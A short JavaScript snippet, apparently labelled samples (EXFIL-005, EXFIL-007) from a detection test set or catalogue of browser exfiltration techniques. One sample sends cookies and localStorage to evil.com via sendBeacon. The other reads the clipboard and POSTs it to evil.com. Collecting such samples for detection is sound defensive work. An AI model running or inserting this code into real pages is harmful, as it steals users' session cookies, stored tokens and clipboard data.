// EXFIL-005: sendBeacon exfiltration
navigator.sendBeacon('https://evil.com/collect', JSON.stringify({
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage)
}));

// EXFIL-007: Clipboard theft
async function stealClipboard() {
  const data = await navigator.clipboard.readText();
  fetch('https://evil.com/clip', { method: 'POST', body: data });
}
